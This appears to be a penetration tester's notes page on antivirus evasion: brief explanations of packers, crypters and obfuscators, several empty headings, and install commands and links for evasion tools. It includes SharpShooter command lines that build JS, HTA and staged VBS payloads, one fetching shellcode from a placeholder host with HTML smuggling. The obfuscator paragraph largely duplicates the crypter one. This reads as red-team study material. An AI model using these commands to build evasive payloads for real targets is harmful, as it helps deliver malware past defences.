# Bypassing AV

## In-Memory Evasion

### Remote Process Memory Injection

### Inline Hooking

### Process Hollowing

#### C# Process Hollowing

### Reflective DLL Injection

## On-Disk Evasion

### Packers <a href="#veil-framework" id="veil-framework"></a>

Reduces the file of an executable. The functionally is equivalent with a complete new binary structure. The result is a new signature therefore bypassing OLDER AV's 

### Crypters <a href="#veil-framework" id="veil-framework"></a>

Alters executable code with cryptography and adds a decrypting stub that stores the original code for execution. The encrypted code is on disk. The decryption happens in memory. This technique can be very effective against AVs.

### Obfuscators <a href="#veil-framework" id="veil-framework"></a>

Alters executable code with cryptography and adds a decrypting stub that stores the original code for execution. The encrypted code is on disk and the decryption happens in memory. This technique can be very effective against AV.  However, obfuscators are often used in scripts whereas crypters are often used in binaries.

## Tools

### Veil Framework <a href="#veil-framework" id="veil-framework"></a>

Install on Kali:

```
apt install veil
/usr/share/veil/config/setup.sh --force --silent
```

Reference: [https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)

### Shellter <a href="#shellter" id="shellter"></a>

Source: [https://www.shellterproject.com/download/](https://www.shellterproject.com/download/)

```
apt install shellter
```

### Sharpshooter <a href="#sharpshooter" id="sharpshooter"></a>

Javascript Payload Stageless:

```
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
```

Stageless HTA Payload:

```
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
```

Staged VBS:

```
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```

Reference: [https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)

### Donut <a href="#donut" id="donut"></a>

Source: [https://github.com/TheWover/donut](https://github.com/TheWover/donut)

### Vulcan <a href="#vulcan" id="vulcan"></a>

Source: [https://github.com/praetorian-code/vulcan](https://github.com/praetorian-code/vulcan)

### GreatSCT

Source: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

### Ebowla Encoding for AV Evasion

